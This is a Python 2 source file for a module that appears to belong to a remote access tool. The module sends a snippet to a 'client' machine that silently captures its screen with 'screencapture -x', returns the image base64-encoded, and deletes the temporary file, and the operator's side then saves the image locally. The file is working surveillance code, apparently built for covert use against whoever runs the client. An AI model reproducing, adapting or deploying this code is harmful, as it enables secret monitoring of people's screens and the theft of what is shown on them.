from helpers import *
import uuid
import os
import base64


class Module:
    """This module takes a screenshot of the client's screen."""

    def __init__(self):
        self.info = {
            "Author": ["Marten4n6"],
            "Description": "Takes a screenshot of the client's screen."
        }
        self.output_folder = None

    def setup(self):
        output_folder = raw_input(MESSAGE_INPUT + "Output folder (empty for Output/): ")
        output_folder = os.path.expanduser(output_folder)

        if not output_folder:
            self.output_folder = "Output"
            return True
        if not os.path.exists(output_folder):
            print MESSAGE_ATTENTION + "That folder doesn't exist!"
            return False

        self.output_folder = output_folder
        return True

    def run(self):
        return """\
        import base64
        
        output_file = "/tmp/screenshot.png"
        
        run_command("screencapture -x {0}".format(output_file))
        print run_command("base64 {0}".format(output_file))
        run_command("rm -rf {0}".format(output_file))
        """

    def process_response(self, response):
        output_name = str(uuid.uuid4()).replace("-", "")[0:12] + ".png"
        output_file = os.path.join(self.output_folder, output_name)

        if not os.path.exists("Output") and self.output_folder == "Output":
            os.mkdir("Output")
        with open(output_file, "w") as open_file:
            open_file.write(base64.b64decode(response))

        print "\n" + MESSAGE_INFO + "Screenshot saved to: {0}".format(os.path.realpath(output_file))
